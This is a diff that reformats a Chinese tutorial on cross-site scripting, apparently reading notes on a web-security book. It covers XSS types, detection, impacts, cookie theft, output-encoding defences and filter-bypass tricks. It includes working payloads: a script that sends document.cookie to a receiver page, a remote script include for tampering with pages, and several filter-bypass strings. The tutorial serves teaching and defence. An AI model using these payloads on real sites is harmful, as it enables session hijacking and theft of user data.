@@ -1,107 +1,104 @@
+# 跨站脚本攻击
 
+跨站脚本简称xss（cross-site scripting），利用方式主要是借助网站本身设计不严谨，导致执行用户提交的恶意js脚本，对网站自身造成危害。
 
-　　跨站脚本简称xss（cross-site scripting），利用方式主要是借助网站本身设计不严谨，导致执行用户提交的恶意js脚本，对网站自身造成危害。
-
-XSS 是如何发生的呢
+## XSS 是如何发生的呢
 假如有下面一个textbox
-
+```html
 <input type="text" name="address1" value="value1from">
+```
 value1from是来自用户的输入，如果用户不是输入value1from,而是输入 "/><script>alert(document.cookie)</script><!- 那么就会变成
-
+```html
 <input type="text" name="address1" value=""/><script>alert(document.cookie)</script><!- ">
-嵌入的JavaScript代码将会被执行
-
- 
-
+```
+嵌入的JavaScript代码将会被执行    
 或者用户输入的是  "onfocus="alert(document.cookie)      那么就会变成 
-
+```html
 <input type="text" name="address1" value="" onfocus="alert(document.cookie)">
- 事件被触发的时候嵌入的JavaScript代码将会被执行
-
- 攻击的威力，取决于用户输入了什么样的脚本
-
+```
+ 事件被触发的时候嵌入的JavaScript代码将会被执行。攻击的威力，取决于用户输入了什么样的脚本
 
 
-Xss分类
-xss大致分为：反射型、存储型、DOM型（这三种为主流）
-反射型xss：只是简单地把用户输入的数据”反射”给浏览器，攻击时需要用户配合点击，也叫”非持久型xss”。（之前项目有遇到过这种，用户在输入时写一个死循环弹出框而导致程序无法正常运行）
-存储型xss：会把用户输入的数据”存储”在服务器端，也叫”持久性xss”，常见留言板等可以提交展示用户输入内容的功能点。
-DOM型xss：从是否存储可划分成反射型，可通过修改页面的DOM节点形成的xss漏洞。
 
-注意：无论反射型还是存储型，都是需要与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；
-而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码，
-因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。
+## Xss分类
+xss大致分为：反射型、存储型、DOM型（这三种为主流）    
+反射型xss：只是简单地把用户输入的数据”反射”给浏览器，攻击时需要用户配合点击，也叫”非持久型xss”。（之前项目有遇到过这种，用户在输入时写一个死循环弹出框而导致程序无法正常运行）    
+存储型xss：会把用户输入的数据”存储”在服务器端，也叫”持久性xss”，常见留言板等可以提交展示用户输入内容的功能点。     
+DOM型xss：从是否存储可划分成反射型，可通过修改页面的DOM节点形成的xss漏洞。     
+
+注意：无论反射型还是存储型，都是需要与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；      
+而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码， 因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。
 
 
-检测XSS
-手工检测：在输入时最特殊字符如< > " ' ()等做转义
-2.工具检测，burpsuit等
+## 检测XSS
+1.手工检测：在输入时最特殊字符如< > " ' ()等做转义             
+2.工具检测，burpsuit等         
 
-Xss危害
-　　xss漏洞是发生在客户端，目的是让浏览器执行一段用户提交的恶意js代码，从而达到某种目的。从表面上看，xss漏洞的危害止步于客户端，
-且主要就是用来执行js获取用户信息（比如浏览器版本等等）。
-然而由于xss漏洞可能发生的地方很多，因此被利用的情况也不统一，以下列举了xss漏洞能够造成的一些危害（xss漏洞危害包含但不仅限于以下几种）。
+## Xss危害
+　　xss漏洞是发生在客户端，目的是让浏览器执行一段用户提交的恶意js代码，从而达到某种目的。从表面上看，xss漏洞的危害止步于客户端，且主要就是用来执行js获取用户信息（比如浏览器版本等等）。然而由于xss漏洞可能发生的地方很多，因此被利用的情况也不统一，以下列举了xss漏洞能够造成的一些危害（xss漏洞危害包含但不仅限于以下几种）。
 
-cookie劫持（窃取cookie）
-钓鱼，利用xss构造出一个登录框，骗取用户账户密码。
-Xss蠕虫（利用xss漏洞进行传播）
-修改网页代码
-利用网站重定向
-获取用户信息（如浏览器信息，IP地址等）
-网站挂马
+cookie劫持（窃取cookie）       
+钓鱼，利用xss构造出一个登录框，骗取用户账户密码。     
+Xss蠕虫（利用xss漏洞进行传播）     
+修改网页代码    
+利用网站重定向     
+获取用户信息（如浏览器信息，IP地址等）     
+网站挂马     
 
-利用xss窃取cookie
+## 利用xss窃取cookie
 利用xss进行cookie获取劫持是最常用的一种姿势，因为其能获取到管理员权限，危害较大，且利用简单。
 
-cookie介绍
-cookie分为内存cookie和硬盘cookie，内存cookie储存在浏览器内存中，关闭浏览器则消失。cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。
-cookie格式：Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]
-cookie各个参数详细内容：
+### cookie介绍
+cookie分为内存cookie和硬盘cookie，内存cookie储存在浏览器内存中，关闭浏览器则消失。cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。              
+cookie格式：Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]         
+cookie各个参数详细内容：                
 
-Set-cookie:http响应头，向客户端发送cookie。
-Name=value:每个cookie必须包含的内容。
-Expires=date:EXpires确定了cookie的有效终止日期，可选。如果缺省，则cookie不保存在硬盘中，只保存在浏览器内存中。
-Domain=domain-name:确定了哪些inernet域中的web服务器可读取浏览器储存的cookie，缺省为该web服务器域名。
-Path=path:定义了web服务器哪些路径下的页面可获取服务器发送的cookie。
-Secure:在cookie中标记该变量，表明只有为https通信协议时，浏览器才向服务器提交cookie。
-Httponly:禁止javascript读取,如果cookie中的一个参数带有httponly，则这个参数将不能被javascript获取；httponly可以防止xss会话劫持攻击。
-利用xss窃取cookie方法
-本地写一个xss_cookie.php页面，用于接收cookie。
+Set-cookie:http响应头，向客户端发送cookie。         
+Name=value:每个cookie必须包含的内容。           
+Expires=date:EXpires确定了cookie的有效终止日期，可选。如果缺省，则cookie不保存在硬盘中，只保存在浏览器内存中。                  
+Domain=domain-name:确定了哪些inernet域中的web服务器可读取浏览器储存的cookie，缺省为该web服务器域名。           
+Path=path:定义了web服务器哪些路径下的页面可获取服务器发送的cookie。             
+Secure:在cookie中标记该变量，表明只有为https通信协议时，浏览器才向服务器提交cookie。                            
+Httponly:禁止javascript读取,如果cookie中的一个参数带有httponly，则这个参数将不能被javascript获取；httponly可以防止xss会话劫持攻击。                     
+### 利用xss窃取cookie方法
+本地写一个xss_cookie.php页面，用于接收cookie。            
 
-在存在xss漏洞的地方，插入以下代码，便可以将cookie发送到xss_cookie.php，并且将cookie参数传递进去，写入文件中。
+在存在xss漏洞的地方，插入以下代码，便可以将cookie发送到xss_cookie.php，并且将cookie参数传递进去，写入文件中。                    
 
-常用获取cookie的js代码(可自行扩展):
-
+常用获取cookie的js代码(可自行扩展):   
+```html
 <img src="http://localhost/cspt/XSS_cookie.php?cookie='+document.cookie"></img>
 <script>new Image().src="http://localhost/cspt/XSS/xss_cookie.php?cookie="+document.cookie;</script>
-提交之后，本地cookie.txt文件中就会写入cookie值。
+``` 
+提交之后，本地cookie.txt文件中就会写入cookie值。                
 
-XSS蠕虫：主要出现在社交软件，依靠社交软件的传播性扩大范围。
-利用xss篡改网页
-前提：网站必须存在存储型xss漏洞，并且会将结果返回到页面上。
-这样我们就可以插入一段js代码，作用在于获取网站源码中的标签，然后修改其中的属性值，达到修改网页的效果。
-实例：修改网站所有连接地址
-本地编写一个test.js脚本，内容如下：
+## XSS蠕虫
+主要出现在社交软件，依靠社交软件的传播性扩大范围。           
+利用xss篡改网页         
+前提：网站必须存在存储型xss漏洞，并且会将结果返回到页面上。             
+这样我们就可以插入一段js代码，作用在于获取网站源码中的标签，然后修改其中的属性值，达到修改网页的效果。            
+实例：修改网站所有连接地址            
+本地编写一个test.js脚本，内容如下：           
 
-将以下语句插入存在存储型xss漏洞的网站
+将以下语句插入存在存储型xss漏洞的网站                 
 
-<script type='text/javascript' src='http://localhost/cspt/XSS/test.js'></script>
-可以发现存在该漏洞的网页上所有的链接都变成了www.google.com。
+<script type='text/javascript' src='http://localhost/cspt/XSS/test.js'></script>                    
+可以发现存在该漏洞的网页上所有的链接都变成了www.google.com。                       
 
-注：javascript加载外部的代码文件可以是任意扩展名（无扩展名也可以）
+注：javascript加载外部的代码文件可以是任意扩展名（无扩展名也可以）               
 
-利用xss获取用户信息
-　　xss获取用户信息，运用最多的还是获取cookie信息，但除此之外，还可以获取用户浏览器版本、外网IP地址、浏览器安装的插件类型等等。以下列举了利用xss获取的客户端用户信息（包含但不仅限于以下几种）。
+## 利用xss获取用户信息
+　　xss获取用户信息，运用最多的还是获取cookie信息，但除此之外，还可以获取用户浏览器版本、外网IP地址、浏览器安装的插件类型等等。以下列举了利用xss获取的客户端用户信息（包含但不仅限于以下几种）。          
 
-alert(navigator.userAgent);读取userAgent内容
-alert(document.cookie);读取用户cookie内容
-利用java环境，调用java Applet的接口获取客户端本地IP
-注：利用Xss漏洞能做的事有很多，前面已经列举了一些，这里便不对每一个都展开讲解，如需了解更多的xss漏洞内容，最好的方式还是看书。
+alert(navigator.userAgent);读取userAgent内容          
+alert(document.cookie);读取用户cookie内容                    
+利用java环境，调用java Applet的接口获取客户端本地IP               
+注：利用Xss漏洞能做的事有很多，前面已经列举了一些，这里便不对每一个都展开讲解，如需了解更多的xss漏洞内容，最好的方式还是看书。                       
 
-Xss漏洞探测
+## Xss漏洞探测
 前面介绍了一些xss漏洞的基础内容，那么如何去检测一个网站（某个点）是否存在xss漏洞呢？
 
-xss探针
+### xss探针
 我们可以在测试xss的位置写入以下代码，查看页面源码，观察哪些代码被过滤或者转义。
 
 1
@@ -172,13 +169,11 @@ HTML属性中输出
 
 Script标签中输出
 即用户输入的内容出现在script标签里面：
-
-1
-2
-3
+```html
 <script>
 var a="$input";  // $input=";alert(/xss/);//"; 则会产生xss漏洞
 </script>
+```
 防御方式，将用户输入进行javascript编码。
 
 在事件中输出
@@ -193,7 +188,8 @@ var a="$input";  // $input=";alert(/xss/);//"; 则会产生xss漏洞
 这个跟在html属性中输出类似，即在a标签的href属性中输出。
 防御方式，将用户输入进行url编码。
 
-总结：总得来说防御xss的方式只是三种：httponly、过滤字符、转义字符。然而使用何种编码转义，什么地方需要做转义才是真正防御xss漏洞的难点及重点，如果能搞明白并解决这个问题，那么xss漏洞将会无处可寻。————《白帽子将web安全》一书xss篇读后感。
+总结：
+总得来说防御xss的方式只是三种：httponly、过滤字符、转义字符。然而使用何种编码转义，什么地方需要做转义才是真正防御xss漏洞的难点及重点，如果能搞明白并解决这个问题，那么xss漏洞将会无处可寻。————《白帽子将web安全》一书xss篇读后感。
 Xss绕过技巧
 　　有xss防御便会有xss绕过防御姿势，这是攻与防不断博弈的表现与成果。作为一名安全工程师，了解如何绕过xss防御可以更好地解决xss防御问题。（这里探讨的绕过xss防御不包含绕过waf的部分）
 
@@ -201,20 +197,19 @@ Xss绕过技巧
 绕过xss filter的前提在于，xss filter使用了黑名单，并且没有过滤完全。
 前提一：如果过滤了”《script》”字符串,但没有过滤”<”、”>”字符，则可以使用javascript:[code]伪协议的形式。
 
-1
+```html
 <img src="javascript:alert('test');">
+```
 前提二：过滤了《script》，且只过滤一次。
-
-1
+```html
 <scr<script>ipt>
+```
 前提三：没有正确处理空格、回车等字符
-
-1
-2
-3
+```html
 <img src="javas
 Cript:
 Alert(/xss/)" width=100>
+ ```
 关于绕过xss filter的方式还有很多，这里不一一展开了，只是列举下常见的方法：
 
 转换大小写
